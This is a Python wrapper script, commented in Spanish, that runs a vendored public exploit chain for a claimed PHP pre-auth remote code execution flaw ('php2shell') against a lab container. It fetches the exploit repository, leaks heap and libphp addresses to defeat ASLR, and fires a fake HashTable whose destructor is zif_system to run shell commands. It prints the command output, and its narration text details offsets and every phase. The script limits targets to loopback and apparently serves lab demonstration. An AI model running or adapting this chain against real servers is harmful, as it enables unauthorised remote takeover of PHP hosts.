#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell_rce.py — wrapper de laboratorio sobre el exploit RCE publico
=======================================================================

CVE-2026-109618 / CVE-2026-109619 ("php2shell") — PHP pre-auth RCE.

Ejecuta la cadena RCE completa (leak de heap via HTTP -> despertar de ASLR
por filtracion -> HashTable falsa -> zif_system) contra el servicio
`rce-target` de ESTE laboratorio, usando el exploit publico verificado
vendido en lab/vendor/php2shell-exp (commit fijado; ver EXPLOTACION.md).

    python3 scripts/php2shell_rce.py --info          # reconocimiento del target
    python3 scripts/php2shell_rce.py --check         # ¿el target es el build calibrado?
    python3 scripts/php2shell_rce.py -c "id"         # cadena completa: uid=33 en pantalla
    python3 scripts/php2shell_rce.py -c "id" --explain  # + narracion de cada fase

GATING (por diseño, no negociable):
  * Solo loopback (127.0.0.0/8 / ::1). El objetivo solo publica en 127.0.0.1.
  * Preflight de identidad: el endpoint /t.php debe responder con el marker
    "PHP_RFC1867_RCE_TARGET_V1" y PHP 8.5.11 — sin marker, no se dispara nada.
  * Uso exclusivo en entorno aislado de laboratorio (aviso legal en cada uso).
  * Comandos <= 14 bytes ASCII (limite fisico del carrier; ver EXPLOTACION.md).

USO EXCLUSIVO EN ENTORNO AISLADO DE LABORATORIO CONTRA CONTENEDORES PROPIOS.
"""

from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
VENDOR = ROOT / "lab" / "vendor" / "php2shell-exp"
EXPLOIT = VENDOR / "tools" / "php2shell_stock_poc.py"
VENDOR_COMMIT = "b1e419912219691417c72b122f6eb410b938eee7"
VENDOR_REPO = "https://github.com/dinosn/php-cve-2026-10961x-lab-poc"

DEFAULT_URL = "http://127.0.0.1:18081/t.php"
REQUIRED_MARKER = "PHP_RFC1867_RCE_TARGET_V1"
REQUIRED_PHP = "8.5.11"
MAX_CMD_BYTES = 14

C_RESET, C_BOLD, C_DIM = "\033[0m", "\033[1m", "\033[2m"
C_CYAN, C_GREEN, C_YELLOW, C_RED = "\033[36m", "\033[32m", "\033[33m", "\033[31m"


def banner(text: str) -> None:
    print(f"\n{C_BOLD}{C_CYAN}== {text} =={C_RESET}")


def note(text: str) -> None:
    print(f"{C_DIM}  {text}{C_RESET}")


def ok(text: str) -> None:
    print(f"{C_GREEN}[✓]{C_RESET} {text}")


def warn(text: str) -> None:
    print(f"{C_YELLOW}[!]{C_RESET} {text}")


def die(text: str, code: int = 2) -> "None":
    print(f"{C_RED}[✗] {text}{C_RESET}", file=sys.stderr)
    sys.exit(code)


# ---------------------------------------------------------------------------
# Gating
# ---------------------------------------------------------------------------

def guard_loopback(url: str) -> None:
    """Solo se dispara contra loopback. Sin excepciones."""
    m = re.match(r"^https?://\[?([0-9.:a-fA-F]+)\]?", url)
    host = m.group(1) if m else ""
    if host.startswith("127.") or host in ("::1", "localhost"):
        return
    die(f"refusing non-loopback target '{url}' — solo objetivos en loopback:\n"
        "     el lab gestionado (127.0.0.1:18081) o una víctima local en 127.0.0.1\n"
        "     (p. ej. otra víctima php2shell en otro puerto). Cambia la URL a loopback.")


def guard_vendor() -> None:
    if EXPLOIT.is_file():
        return
    die(f"no se encuentra el exploit vendido en {VENDOR}\n"
        f"     Descargalo con:\n"
        f"       git clone --depth 1 {VENDOR_REPO} {VENDOR}\n"
        f"       cd {VENDOR} && git checkout {VENDOR_COMMIT}\n"
        f"     (ver 'make vendor-exploit' en el Makefile)\n"
        f"     y levanta el objetivo con: make rce-target")


# ---------------------------------------------------------------------------
# Preflight de identidad del target
# ---------------------------------------------------------------------------

RCE_URL = "http://127.0.0.1:18081/t.php"  # lab gestionado (== URL por defecto del wrapper)
RCE_CONTAINER = "php2shell-rce-target"
RCE_IMAGE_DIGEST = (
    "sha256:974e3a920309308e1690ed607e6cc3061d6906f90cc8d30fe519daa48bccf101"
)


def target_identity(url: str, timeout: float = 5.0) -> dict:
    """Identidad del target.

    Lab gestionado (URL por defecto, :18081): SIN ninguna peticion HTTP.
      Por que sin HTTP: la fase de fire esta calibrada sobre la geometria
      exacta del heap del worker y CUALQUIER request previo (incluso un
      JSON estatico servido por Apache) desplaza el heap y el carrier no
      aterriza (verificado: fire 0/5 con preflight HTTP vs 4/4 sin el).
      La identidad se comprueba por docker:
        * digest de la imagen del contenedor (build calibrado, offsets OK)
        * lab/rce/www/identity.json leido con docker exec (marker + version)

    Target externo (cualquier otra URL): la identidad se lee por HTTP del
      propio nodo (GET t.php devuelve el JSON de identidad). Solo seguro en
      modos sin fire (info/leak); el modo rce externo salta este preflight.
    """
    import shutil
    external = url.rstrip("/") != RCE_URL.rstrip("/")
    if external:
        try:
            with urllib.request.urlopen(url, timeout=timeout) as resp:
                data = json.loads(resp.read().decode(errors="replace"))
        except (urllib.error.URLError, OSError, json.JSONDecodeError) as exc:
            die(f"no pude leer la identidad de {url}: {exc}\n"
                "     ¿es un nodo php2shell que responde el JSON de identidad?")
        # El JSON de t.php usa 'version'; el identity.json del lab usa 'php'.
        # Normalizo para que check_target lea la misma clave en ambas ramas.
        data.setdefault("php", data.get("version"))
        data["_via_http"] = True
        return data
    docker = shutil.which("docker")
    if not docker:
        die("docker CLI no disponible: no puedo verificar la identidad sin HTTP\n"
            "     y un preflight HTTP rompe la ventana del fire. Abortando.")
    image = subprocess.run(
        [docker, "inspect", "-f", "{{.Image}}", RCE_CONTAINER],
        capture_output=True, text=True,
    ).stdout.strip()
    if not image:
        die(f"contenedor {RCE_CONTAINER} no esta corriendo\n"
            "     levantalo con: make rce-target")
    if image != RCE_IMAGE_DIGEST:
        die(f"la imagen del contenedor NO es el build calibrado\n"
            f"     actual : {image[:19]}...\n"
            f"     esperada: {RCE_IMAGE_DIGEST[:19]}...\n"
            "     los offsets del exploit solo valen para el build fijado.\n"
            "     Recrea el objetivo: make rce-target")
    ident = subprocess.run(
        [docker, "exec", RCE_CONTAINER, "cat", "/var/www/html/identity.json"],
        capture_output=True, text=True,
    ).stdout
    try:
        data = json.loads(ident)
    except json.JSONDecodeError:
        die("lab/rce/www/identity.json no es el fichero de identidad esperado")
    return data


def check_target(url: str, quiet: bool = False) -> dict:
    data = target_identity(url)
    marker = data.get("marker")
    version = data.get("php")
    if marker != REQUIRED_MARKER:
        die(f"marker del target no reconocido: {marker!r}\n"
            "     Esperaba PHP_RFC1867_RCE_TARGET_V1 (lab/rce/www). No se dispara nada.")
    if version != REQUIRED_PHP:
        die(f"version PHP inesperada: {version!r} (esperaba {REQUIRED_PHP})")
    if not quiet:
        ok(f"target identificado: {REQUIRED_MARKER}, PHP {version} (fixed: 8.5.12)")
        if data.get("_via_http"):
            note("preflight por HTTP (JSON de identidad del propio nodo):")
            note("válido en modos sin fire; en rce externo el preflight se omite entero")
        else:
            note("preflight por docker (digest de imagen + identity.json):")
            note("cero peticiones HTTP antes de la cadena — el heap queda intacto")
    return data


# ---------------------------------------------------------------------------
# Modo --check: ¿es este build el calibrado? (sin enviar el par de fire)
# ---------------------------------------------------------------------------

def mode_check(url: str) -> int:
    banner("CHECK — identidad + oracle de leak (sin fire)")
    note("modo seguro: solo la fase de leak; el par de fire NUNCA se envia")
    if url.rstrip("/") != RCE_URL.rstrip("/"):
        # Target externo: la identidad se lee por HTTP (GET), y CUALQUIER GET
        # previo desplaza el heap y mata el leak (verificado). Orden invertido:
        # leak PRIMERO, identidad y gates DESPUES — el chequeo es sin fire,
        # así que no hay riesgo en disparar el POST del leak sobre un target
        # cuya identidad se confirma a posteriori.
        rc = run_exploit(["--stage", "leak", "--url", url, "--php", REQUIRED_PHP], tail=8)
        check_target(url)
        return rc
    check_target(url)
    return run_exploit(["--stage", "leak", "--url", url, "--php", REQUIRED_PHP], tail=8)


# ---------------------------------------------------------------------------
# Modo --info: reconocimiento puro (version + build fingerprint)
# ---------------------------------------------------------------------------

def mode_info(url: str) -> int:
    banner("INFO — reconocimiento del target")
    # --info no dispara nada: puede permitirse un GET PHP (health.php)
    # para mostrar identidad dinamica (pid del worker, config real).
    # OJO: si pretendes encadenar un disparo justo despues, recrea el
    # contenedor (make rce-target): este GET desplaza el heap del worker.
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            data = json.loads(r.read().decode("utf-8", "replace"))
        print(json.dumps(data, indent=2, ensure_ascii=False))
    except Exception as e:  # noqa: BLE001
        note(f"health.php no disponible ({e}); uso la identidad estática")
        data = target_identity(url)
        print(json.dumps(data, indent=2, ensure_ascii=False))
    print()
    ok(f"PHP {data.get('version')} — rama vulnerable (fixed en 8.5.12)")
    note("¿vulnerable por version? -> SI (8.5.11, pre-patch)")
    note("¿cadena RCE aplicable?    -> depende del BUILD exacto (ver --check)")
    note("un mismo tag de imagen puede traer snapshots distintos de libphp;")
    note("los offsets (zif_system @ libphp+0x5996e0) solo valen para el build calibrado.")
    return 0


# ---------------------------------------------------------------------------
# Motor: invoca el exploit vendido
# ---------------------------------------------------------------------------

def run_exploit(extra: list[str], tail: int = 40, stream: bool = True) -> int:
    cmd = [sys.executable, str(EXPLOIT)] + extra
    proc = subprocess.run(cmd, capture_output=not stream, text=True, timeout=420)
    if stream:
        return proc.returncode
    lines = (proc.stdout + proc.stderr).splitlines()
    for line in lines[-tail:]:
        print(f"    {line}")
    return proc.returncode


EXPLAIN = {
    "pre":  "FASE 1-2  Leak: POST multipart con chunked (~129 MB) fuerza el OOM DENTRO de\n"
            "          php_session_send_cookie -> php_url_encode. PS(id) queda colgando y\n"
            "          PS(send_cookie)=1. La respuesta devuelve una cookie de ~600 KB que\n"
            "          decodifica AMBAS bases de una vez (punteros alineados a 2 MiB ->\n"
            "          chunk base; valores repetidos de zval_ptr_dtor -> base de libphp).\n"
            "          ASLR cae por FILTRACION, no por fuerza bruta.",
    "fire": "FASE 3-4  Fire: productor recalibrado (66 pad fields) mueve el slot de\n"
            "          referencia a una pagina bin-56; 800 portadores vivos de 31 bytes y\n"
            "          una HashTable falsa en chunk+0xB30D8 hacen que el cleanup ejecute\n"
            "          pDestructor = zif_system con tu comando (<=14 bytes).\n"
            "          El worker muere DESPUES de ejecutar (la prueba se escribe primero).",
}


def _proof_read(url: str, out_name: str) -> "str | None":
    """Lee la prueba (out_name) del target y devuelve su CONTENIDO completo.

    Lab gestionado: bind del host (lectura directa del fichero del docroot).
    Target externo: HTTP GET a la RAIZ del sitio (la prueba vive en /<name>;
    construir el URL desde t.php daria /t.php/<name> y seria 404).
    Devuelve la cadena (posible cadena vacia = el comando no escribio nada)
    o None si el fichero no existe (el comando no llego a ejecutarse).
    """
    if url.rstrip("/") == RCE_URL.rstrip("/"):
        f = ROOT / "lab" / "rce" / "www" / out_name
        try:
            return f.read_text(errors="replace")
        except OSError:
            return None
    parsed = urllib.parse.urlsplit(url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    try:
        with urllib.request.urlopen(f"{root}/{out_name}", timeout=6) as resp:
            return resp.read().decode(errors="replace")
    except urllib.error.HTTPError:
        return None
    except (urllib.error.URLError, OSError):
        return None


def fire_once(url: str, cmd: str, expect: str = "",
              quiet: bool = True) -> "tuple[int, str | None, dict]":
    """Primitivo de la cadena completa (probe de geometria + fire), sin narrar.

    cmd llega SIN la redireccion (se anade aqui). expect="" acepta cualquier
    prueba existente en vez de exigir 'uid=' — es lo que hace que comandos
    arbitrarios (ls -la, cat, ...) den veredicto correcto en vez de falsos
    negativos. Devuelve (rc, contenido_de_la_prueba|None, info) con la info
    cruda (probe_out, fire_out, ...) para los diagnosticos del caller.
    """
    import random
    import string

    external = url.rstrip("/") != RCE_URL.rstrip("/")
    # Lab: prueba 'o', con residual limpiado antes de cada tiro. Externo:
    # nombre aleatorio de 2 chars para no confundir la prueba con residuos
    # de tiros anteriores (sin acceso al fs del target para limpiarlos).
    out_name = ("".join(random.choices(string.ascii_lowercase + string.digits, k=2))
                if external else "o")
    effective = f"{cmd}>{out_name}"
    if len(effective.encode()) + 5 <= MAX_CMD_BYTES:  # cabe capturar stderr tambien
        effective = f"{cmd}>{out_name} 2>&1"
    assert len(effective.encode()) <= MAX_CMD_BYTES, effective
    if not external:
        (ROOT / "lab" / "rce" / "www" / out_name).unlink(missing_ok=True)

    info: dict = {"effective": effective, "out_name": out_name, "external": external}

    probe = subprocess.run(
        [sys.executable, str(EXPLOIT), "--stage", "leak", "--url", url,
         "--php", REQUIRED_PHP],
        capture_output=True, text=True, timeout=180,
    )
    probe_out = probe.stdout + probe.stderr
    info["probe_out"] = probe_out
    leak_m = re.search(r"LEAK heap=(0x[0-9a-f]+) libphp=(0x[0-9a-f]+)", probe_out)
    if probe.returncode != 0 or not leak_m:
        conn = re.search(r"(Connection refused|timed out|Name or service not known|Errno -?\d+)", probe_out)
        if conn:
            die(f"target inalcanzable ({conn.group(1).lower()}): comprueba la URL\n"
                "     y que el host victima este levantado y alcance, sin proxy en medio.")
        delta = re.search(r"delta (0x-?[0-9a-f]+)", probe_out)
        why = f" (delta {delta.group(1)} fuera de la ventana del exploit)" if delta else ""
        if not quiet:
            recreate = ("recreando contenedor..." if not external else
                        "reintenta tras reiniciar el worker del target...")
            warn(f"boot con geometria no apta{why} — {recreate}")
        return 1, None, info
    heap, module = leak_m.group(1), leak_m.group(2)
    if not quiet:
        ok(f"boot apto: chunk={heap} libphp={module}")

    proc = subprocess.run(
        [sys.executable, str(EXPLOIT), "--stage", "fire", "--heap", heap,
         "--module", module, "--url", url, "--cmd", effective,
         "--fetch", "/" + out_name, "--expect", expect, "--php", REQUIRED_PHP],
        capture_output=True, text=True, timeout=420,
    )
    fire_out = proc.stdout + proc.stderr
    info["fire_out"] = fire_out
    res = re.search(r"RESULT fire=(\d)", fire_out)
    info["result"] = res.group(1) if res else None
    if not quiet:
        fire = re.search(r"FIRE (\d)/(\d+)(.*)", fire_out)
        if fire:
            ok(f"FASE 3-4 fire: intentos {fire.group(1)}/{fire.group(2)}{fire.group(3)}")

    # Prueba: contenido COMPLETO del fichero de salida (no solo la linea
    # 'uid='). Existe = el comando ejecuto; cadena vacia = ejecuto y no
    # escribio nada; None = no llego a ejecutar.
    proof = _proof_read(url, out_name)
    if proof is None:
        m = re.search(r"uid=\d+\([^)]*\)[^\n]*", fire_out)
        proof = m.group(0).strip() if m else None
    if not quiet and proof is not None:
        size = len(proof.encode())
        note(f"prueba recuperada ({size} bytes): /{out_name}")
    return (0 if proof is not None else 1), proof, info


def mode_rce(url: str, cmd: str, expect: str, explain: bool, quiet: bool) -> int:
    banner("RCE — cadena completa (leak + fire)")
    if url.rstrip("/") != RCE_URL.rstrip("/"):
        # Target externo: NO se hace preflight (ni docker ni HTTP) — cualquier
        # request previo rompe la ventana del fire. La identidad del build la
        # validan los gates del propio exploit (ventana de plausibilidad del
        # delta, mayoria de punteros alineados a 2 MiB).
        if not quiet:
            note("target externo: preflight omitido (un request previo rompería la ventana del fire)")
            note("los gates internos del exploit validan el build durante el leak")
    else:
        check_target(url, quiet=quiet)

    cmd = cmd.strip()
    if not cmd or not cmd.isascii():
        die(f"comando invalido: {cmd!r} (solo ASCII)")
    if re.search(r"[;&|`$<>\"']", cmd):
        die("el comando no puede contener metacaracteres de shell (;&|`$<>\"') en modo directo.\n"
            "     Para sintaxis completa usa la pseudoshell: python3 php2shell.py shell -u <url>")
    if len(cmd.encode()) > MAX_CMD_BYTES - 2:  # sitio para '>o'
        die(f"comando demasiado largo: {cmd!r} (<= {MAX_CMD_BYTES - 2} bytes en modo directo.\n"
            f"     Para comandos largos usa la pseudoshell: python3 php2shell.py shell -u <url>)")

    # expect adaptativo: para comandos que no son 'id', la prueba es el
    # fichero de salida (existencia), no el literal 'uid='.
    if not expect and cmd.startswith("id"):
        expect = "uid="
    if explain:
        print(EXPLAIN["pre"])
        print()
    warn("USO EXCLUSIVO EN LABORATORIO AISLADO — contenedor propio")

    rc, proof, info = fire_once(url, cmd, expect=expect, quiet=quiet)
    if not quiet:
        note(f"comando efectivo: sh -c {info['effective']!r}")

    fire_out = info.get("fire_out", "")
    fire = re.search(r"FIRE (\d)/(\d+)(.*)", fire_out)
    if explain and fire:
        print()
        print(EXPLAIN["fire"])
        print()
    if fire and not quiet:
        ok(f"FASE 3-4 fire: intentos {fire.group(1)}/{fire.group(2)}{fire.group(3)}")

    if proof is not None:
        text = proof.strip()
        shown = text if text else "(sin salida) — el comando ejecuto y no escribio nada"
        longest = max(len(ln) for ln in shown.splitlines() or [shown])
        width = max(46, longest + 2)
        print()
        print(f"{C_BOLD}{C_GREEN}╔{'═' * width}╗")
        print(f"║  RCE CONFIRMADA — salida del comando:{' ' * (width - 38)}║")
        for ln in shown.splitlines() or [shown]:
            print(f"║  {ln:<{width - 2}}║")
        print(f"╚{'═' * width}╝{C_RESET}")
        if info.get("result") == "1":
            note("veredicto del exploit: fire=1 (prueba escrita y recuperada)")
        if explain:
            print()
            note("Lo que acaba de pasar, en una linea: la destruccion 'ordenada' de la")
            note("sesion por parte de PHP ejecuto un destructor FALSO colocado por el")
            note("atacante; ese destructor era zif_system; system() corrio TU comando.")
        return 0

    # Sin prueba: diagnostico honesto
    print()
    if info.get("result") == "0":
        warn("la cadena se disparo pero no hubo prueba recuperable (fire=0).")
        note("causas tipicas: leak valido pero el worker no ejecuto el carrier, o el")
        note("comando no escribio la salida donde se esperaba. Reintenta: la geometria")
        note("del heap depende de la aleatoriedad de esta generacion ASLR.")
    elif "proof already present" in fire_out:
        warn("el exploit encontro una prueba PREVIA en el target y se nego a disparar")
        note("(se protege contra veredictos viejos). Elimina lab/rce/www/o y reintenta.")
    elif "LEAK heap=" not in info.get("probe_out", ""):
        warn("leak fallido en esta generacion ASLR (el propio autor documenta 2/3-3/3 por target).")
        note("reintenta: cada ejecucion es una nueva generacion de ASLR.")
    else:
        warn("la cadena se ejecuto sin prueba verificable en esta generacion ASLR.")
        note("reintenta con contenedor fresco: make rce")
    if not quiet:
        print()
        for line in fire_out.splitlines()[-12:]:
            print(f"    {line}")
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell RCE de laboratorio (CVE-2026-109618/109619) — solo loopback",
        epilog="USO EXCLUSIVO EN ENTORNO AISLADO DE LABORATORIO. Documentacion: EXPLOTACION.md",
    )
    ap.add_argument("-c", "--cmd", metavar="CMD", help='comando a ejecutar en el target (<=14 bytes ASCII)')
    ap.add_argument("--info", action="store_true", help="reconocimiento: version + identidad del target")
    ap.add_argument("--check", action="store_true", help="identidad + oracle de leak (sin fire)")
    ap.add_argument("--explain", action="store_true", help="narracion didactica de cada fase durante la ejecucion")
    ap.add_argument("-u", "--url", default=DEFAULT_URL, help=f"target (default: {DEFAULT_URL})")
    ap.add_argument("--expect", default="", help="cadena esperada en la prueba (vacio = auto: uid= para id, existencia para el resto)")
    ap.add_argument("--quiet", action="store_true", help="menos output (para grabar)")
    args = ap.parse_args()

    guard_loopback(args.url)
    guard_vendor()

    if args.info:
        return mode_info(args.url)
    if args.check:
        return mode_check(args.url)
    if args.cmd:
        return mode_rce(args.url, args.cmd, args.expect, args.explain, args.quiet)
    ap.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
